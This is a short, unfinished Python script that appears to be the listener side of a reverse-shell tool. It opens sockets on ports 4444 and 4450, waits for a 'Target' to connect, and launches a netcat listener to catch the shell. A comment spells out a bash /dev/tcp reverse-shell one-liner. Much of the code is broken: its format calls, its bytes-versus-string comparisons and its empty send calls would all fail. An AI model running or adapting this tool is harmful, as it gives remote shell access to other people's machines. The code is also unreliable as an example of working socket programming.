import socket
import threading
from  _thread import start_new_thread
import os
import time
import sys

#client reverse shell:
#bash -i >& /dev/tcp/IP/PORT 0>&1


print("Initializing server...")
time.sleep(1)

ssh_cmd = ""
IP = input("YourIPShouldBeMasked: ")
IP_PORT = 4444
IP_PORT_2 = 4450
print("Initializing server...")
time.sleep(1)

def connection_thread(conn, addr):
  with conn:
    message = conn.recv(4096)
    if message =="Reverse_Shell_Status: 200":
      conn.send((IP, IP_PORT))
        
    if message == "Terminal Opened: 200":
      print("Connection Established: ")
      #pending Code
    else:
      conn.close()
    if message =="Netcat Verified":
      os.system("nc -lvp {port}".format(IP_PORT))
    elif message=="Netcat Invalid":
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.bind((IP, IP_PORT))
          s.listen()
          connshell, addrshell = s.accept()
          with connshell:
            connshell.send()

time.sleep(1)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  s.bind((IP, IP_PORT_2))
  s.listen()
  print("Server established, waiting for connections...")
  conn, addr = s.accept()
  print("Connection Established: Target {addr}".format(addr))
  
  start_new_thread(connection_thread, (conn, addr))
  
